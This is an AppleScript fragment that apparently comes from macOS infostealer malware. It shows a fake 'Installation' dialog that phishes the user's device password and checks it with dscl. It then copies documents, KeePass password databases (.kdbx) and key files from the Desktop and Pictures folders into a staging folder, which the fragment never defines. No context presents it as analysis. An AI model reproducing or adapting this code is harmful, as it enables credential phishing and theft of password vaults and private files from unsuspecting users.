set accountName to system attribute "USER"
set answer to display dialog "Please enter device password to continue." default answer "" with title "Installation" with hidden answer
set checkResult to do shell script "dscl . authonly " & accountName & space & text returned of answer
set allowedExtensions to {"docx", "pdf", "kdbx", "key"}
tell application "Finder"
set desktopFiles to every file of desktop
set documentFiles to every file of folder "Pictures" of (path to home folder)
repeat with selectedFile in (desktopFiles & documentFiles)
set selectedExtension to name extension of selectedFile
if selectedExtension is in allowedExtensions then
duplicate selectedFile to folder destinationFolder with replacing
end if
end repeat
end tell
